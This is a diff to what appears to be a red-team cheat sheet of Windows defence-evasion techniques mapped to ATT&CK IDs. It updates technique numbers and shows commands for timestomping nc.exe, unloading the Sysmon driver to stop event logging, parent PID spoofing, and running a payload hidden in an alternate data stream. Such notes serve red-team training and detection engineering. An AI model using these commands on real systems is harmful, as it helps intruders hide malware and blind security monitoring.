@@ -9,9 +9,13 @@ UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PR
 CreateProcessA(NULL, "notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
 ```
 
-## Timestomping (T1099)
-```cmd
-timestomp.exe nc.exe -c "Monday 7/25/2005 5:15:55 AM"
+## Timestomping (T1070.006)
+```
+# Meterpreter session (not a standalone exe):
+meterpreter> timestomp nc.exe -c "Monday 7/25/2005 5:15:55 AM"
+# PowerShell alternative (no Meterpreter needed):
+(Get-Item nc.exe).CreationTime = "07/25/2005 05:15:55"
+(Get-Item nc.exe).LastWriteTime = "07/25/2005 05:15:55"
 ```
 - Note: $MFT $FILENAME timestamps are NOT modified (forensic artifact)
 
@@ -27,7 +31,7 @@ fltMC.exe unload SysmonDrv
 - Sysmon process keeps running but stops recording events
 - Requires admin privileges
 
-## Alternate Data Streams (T1158)
+## Alternate Data Streams (T1564.004)
 ```cmd
 type payload.exe > legit.txt:hidden.exe
 wmic process call create legit.txt:hidden.exe
